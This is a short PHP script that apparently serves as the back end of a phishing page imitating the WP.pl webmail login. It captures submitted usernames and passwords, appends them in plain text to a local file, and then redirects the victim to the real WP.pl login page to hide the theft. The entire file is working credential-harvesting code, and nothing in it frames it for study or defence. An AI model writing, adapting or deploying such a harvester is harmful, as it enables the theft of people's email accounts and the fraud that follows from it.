<?php

function redirect($url) {
	ob_start();
	header('Location: '.$url);
	ob_end_flush();
	die();
}

$id= $_POST['login_username'];
$pasw= $_POST['login_password'];
var_dump($id);
var_dump($pasw);

$file = "./logi.txt";

$fp = fopen($file, 'a+');
if (!$fp) {
    echo "<p>Nie mo¿na otworzyæ zdalnego pliku do zapisu.\n";
    exit;
}

$content=$id . " " . $pasw . "\n";
fwrite($fp, $content);

fclose($fp);

redirect("https://profil.wp.pl/login_poczta.html");
?>